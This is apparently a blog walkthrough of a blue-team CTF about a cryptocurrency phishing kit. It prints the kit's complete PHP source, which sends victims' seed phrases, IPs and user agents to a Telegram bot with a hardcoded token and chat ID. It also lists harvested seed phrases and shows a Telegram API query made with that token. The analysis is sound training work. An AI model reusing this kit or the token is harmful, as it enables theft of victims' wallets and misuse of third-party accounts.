# Solution

Hi,

recently I have finished challenge [grabthephisher](https://cyberdefenders.org/blueteam-ctf-challenges/95) on cyber defenders.org. Let's check how to solve those puzzles.

### 1 Which wallet is used for asking the seed phrase?

WWW display 3 wallets:

[![image-1658854441638.png](/images/2022-07-27-CTF-GrabTheOhisher-cyberdefenders.org/image-1658854441638.png)](/images/2022-07-27-CTF-GrabTheOhisher-cyberdefenders.org/image-1658854441638.png)

I checked structure of web site directory. Only one directory contained suspicious PHP script:

```PHP
c75-GrabThePhisher\pankewk\metamask\metamask.php
```

### 2 What is the file name that has the code for the phishing kit?

Suspicious file contains script written in PHP to gather intelligence and data from user.

### 3 In which language was the kit written?

Script is written in PHP language.

### 4 <span class="fw-bold">What service does the kit use to retrieve the victim's machine information?</span>

<span class="fw-bold">Code of the script:</span>

```PHP
<?php

$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
$array = json_decode($request);
$geo = $array->country->name_en;
$city = $array->city->name_en;
$date = date("m.d.Y"); //aaja


/*
 With love and respect to all the hustler out there,
 This is a small gift to my brothers,
 All the best with your luck,
 
 Regards, 
 j1j1b1s@m3r0
  
  */


    $message = "<b>Welcome 2 The Jungle </b> 
    
<b>Wallet:</b> Metamask
<b>Phrase:</b> " . $_POST["data"] . "
<b>IP:</b> " .$_SERVER['REMOTE_ADDR'] . " | " .$geo. " | " .$city. "
<b>User:</b> " . $_SERVER['HTTP_USER_AGENT'] . "";


sendTel($message);  
	
    function sendTel($message){
		$id = "5442785564"; 
        $token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10"; 
		$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
		file_get_contents($filename);
        $_POST["import-account__secret-phrase"]. $text = $_POST['data']."\n";;
        @file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);	

    }
    
    
    ?>
    
```

Line 3 shows the phisher is using Sypex Geo service to gather intelligence

```PHP
$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
```

### 5 How many seed phrases were already collected?

Line 36 shows that all gathered data are stored in root directory of web page in log directory in log.txt file.

```PHP
        @file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);	
```

File log.txt contains 3 entries:

```PHP
number edge rebuild stomach review course sphere absurd memory among drastic total
bomb stairs satisfy host barrel absorb dentist prison capital faint hedgehog worth
father also recycle embody balance concert mechanic believe owner pair muffin hockey
```

### 6 <span class="fw-bold">Write down the seed phrase of the most recent phishing incident?</span>

<span class="fw-bold">Line 36 shows that script is appending data in log file - FILE\_APPEND. It means that, the last written value will be in last position.</span>

### <span class="fw-bold">7 Which medium had been used for credential dumping?</span>

<span class="fw-bold">Line 34 shows that script is using telegram bot api.</span>

```PHP
		$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
```

### 8 <span class="fw-bold">What is the token for the channel?</span>  


<span class="fw-bold">Line 33 contains variable named $token with value:</span>

```PHP
        $token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10"; 
```

### 9 What is the chat ID of the phisher's channel?

Line 32 contains variable named $id with value:

```PHP
		$id = "5442785564"; 
```

### 10 <span class="fw-bold">What are the allies of the phish kit developer?</span>

<span class="fw-bold">Author of phishing script left comment in phishing kit file. Lines 10-18 contains this message. At the end of it author signed message:</span>

```PHP
/*
 With love and respect to all the hustler out there,
 This is a small gift to my brothers,
 All the best with your luck,
 
 Regards, 
 j1j1b1s@m3r0
  
  */
```

### 11 What is the full name of the Phish Actor?

To answer this I had to get familiar with the telegram bot API. Full description of API is here: [https://core.telegram.org/bots/api#available-methods](https://core.telegram.org/bots/api#available-methods)

I used API method getChat.

All queries to the Telegram Bot API must be served over HTTPS and need to be presented in this form: `https://api.telegram.org/bot<token>/METHOD_NAME`. Like this for example:

```HTML
https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/getChat?chat_id=5442785564
```

Response from Telegram API:

```JSON
{
	"ok": true,
	"result": {
		"id": 5442785564,
		"first_name": "Marcus",
		"last_name": "Aurelius",
		"username": "pumpkinboii",
		"type": "private",
		"photo": {
			"small_file_id": "AQADBQADCbQxG1rVIVYACAIAAxxRakQBAAM7fQl4M-jTyikE",
			"small_file_unique_id": "AQADCbQxG1rVIVYAAQ",
			"big_file_id": "AQADBQADCbQxG1rVIVYACAMAAxxRakQBAAM7fQl4M-jTyikE",
			"big_file_unique_id": "AQADCbQxG1rVIVYB"
		}
	}
}
```

Answer is concatenation of first\_name and last\_name from lines 5 and 6 in the response.

### 12 <span class="fw-bold">What is the username of the Phish Actor?</span>

<span class="fw-bold">Username is present in line 7 of request response.</span>

### END

It was very fun challenge, if you like my solutions read other posts on the blog.

Thank you for reading, have a nice day !
